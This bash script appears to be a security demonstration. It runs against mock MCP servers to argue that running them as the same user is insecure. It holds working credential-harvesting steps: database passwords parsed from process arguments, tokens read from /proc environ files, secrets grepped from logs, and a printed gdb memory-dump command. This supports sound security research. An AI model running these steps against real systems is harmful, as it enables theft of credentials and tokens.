#!/bin/bash
# Demonstrates various attack techniques against same-user MCP deployment
# Shows how trivial it is to compromise everything when running as same user

echo "=== Same-User MCP Attack Demonstration ==="
echo "[*] Running as user: $(whoami)"
echo "[*] Demonstrating attack techniques that require NO privilege escalation"
echo

# Check if mock servers are running
if [ ! -f /tmp/mcp-demo-pids.txt ]; then
    echo "[!] Mock servers not running. Run ./launch-mcp-servers.sh first"
    exit 1
fi

echo "=== Phase 1: Process Enumeration ==="
echo "[*] Finding all MCP servers (simple ps command)..."
echo
ps aux | grep -E "mock-mcp-server" | grep -v grep | while read line; do
    echo "Found: $line" | cut -c1-120
done
echo

echo "=== Phase 2: Command Line Credential Extraction ==="
echo "[*] Extracting database credentials from process arguments..."
echo
DB_PROCESS=$(ps aux | grep -E "mock-mcp-server.*postgresql" | grep -v grep | head -1)
if [ ! -z "$DB_PROCESS" ]; then
    DB_CREDS=$(echo "$DB_PROCESS" | grep -oE 'postgresql://[^ ]+')
    echo "[+] Database credentials found: $DB_CREDS"
    # Parse the connection string
    echo "[+] Parsed credentials:"
    echo "    - Username: $(echo $DB_CREDS | sed 's/postgresql:\/\/\([^:]*\):.*/\1/')"
    echo "    - Password: $(echo $DB_CREDS | sed 's/postgresql:\/\/[^:]*:\([^@]*\)@.*/\1/')"
    echo "    - Host: $(echo $DB_CREDS | sed 's/.*@\([^:\/]*\).*/\1/')"
    echo "    - Database: $(echo $DB_CREDS | sed 's/.*\///')"
fi
echo

echo "=== Phase 3: Environment Variable Theft ==="
echo "[*] Extracting tokens from process environments..."
echo

# Read PIDs
PIDS=$(cat /tmp/mcp-demo-pids.txt)

for PID in $PIDS; do
    if [ -d /proc/$PID ]; then
        echo "[*] Checking PID $PID..."
        # Extract sensitive environment variables
        if [ -r /proc/$PID/environ ]; then
            ENV_VARS=$(cat /proc/$PID/environ 2>/dev/null | tr '\0' '\n' | grep -E '(TOKEN|KEY|PASSWORD|SECRET)' || true)
            if [ ! -z "$ENV_VARS" ]; then
                echo "$ENV_VARS" | while read var; do
                    echo "    [+] $var"
                done
            fi
        fi
    fi
done
echo

echo "=== Phase 4: File Descriptor Inspection ==="
echo "[*] Checking for open pipes and sockets..."
echo
for PID in $PIDS; do
    if [ -d /proc/$PID/fd ]; then
        SERVER_TYPE=$(cat /proc/$PID/environ 2>/dev/null | tr '\0' '\n' | grep MOCK_SERVER_TYPE | cut -d= -f2)
        echo "[*] $SERVER_TYPE server (PID $PID) file descriptors:"
        ls -la /proc/$PID/fd 2>/dev/null | grep -E '(pipe|socket)' | head -3
    fi
done
echo

echo "=== Phase 5: Memory Strings Extraction ==="
echo "[*] Simulating memory dump for credentials (would use gdb in real attack)..."
echo "[*] Command: gdb -p <PID> -batch -ex 'dump memory /tmp/dump 0x0 0xFFFFFFFF'"
echo "[*] Then: strings /tmp/dump | grep -E '(password|token|key|secret)'"
echo "[!] Skipping actual memory dump in demo (requires gdb)"
echo

echo "=== Phase 6: Log File Analysis ==="
echo "[*] Checking MCP server logs for leaked secrets..."
if [ -d /tmp/mcp-demo-logs ]; then
    for log in /tmp/mcp-demo-logs/*.log; do
        if [ -f "$log" ]; then
            echo "[*] Checking $(basename $log)..."
            grep -E "(Token|Key|Password|secret|credential)" "$log" 2>/dev/null | head -2 | sed 's/^/    /'
        fi
    done
fi
echo

echo "=== Phase 7: Network Connection Mapping ==="
echo "[*] Checking what external services these MCP servers connect to..."
echo "[*] Command: ss -tunp | grep <PID> (would show real connections)"
echo "[*] In production, this would reveal:"
echo "    - Database connections"
echo "    - API endpoints"
echo "    - Cloud service connections"
echo "    - Internal service mesh"
echo

echo "=== Attack Summary ==="
echo
echo "[!] Credentials and tokens extracted WITHOUT any privilege escalation:"
echo

# Count what we found
DB_COUNT=$(ps aux | grep -c "postgresql://" | grep -v grep || echo 0)
TOKEN_COUNT=$(cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -cE '(TOKEN|KEY)=' || echo 0)

echo "    - Database credentials: Found in process arguments"
echo "    - API tokens: Found $TOKEN_COUNT in environment variables"
echo "    - File access: Full access to user's home directory"
echo "    - Memory access: Can dump any MCP server memory"
echo "    - Network traffic: Can intercept all STDIO communication"
echo

echo "[!] Time taken: < 30 seconds"
echo "[!] Privileges required: NONE (same user)"
echo "[!] Detection likelihood: ~0% (looks like normal user activity)"
echo
echo "[!] In a real attack, attacker now has access to:"
echo "    - Production databases"
echo "    - GitHub repositories"  
echo "    - AWS infrastructure"
echo "    - Slack communications"
echo "    - JIRA tickets"
echo "    - Any other integrated services"
echo
echo "=== This is why MCP's same-user model is catastrophically insecure ==="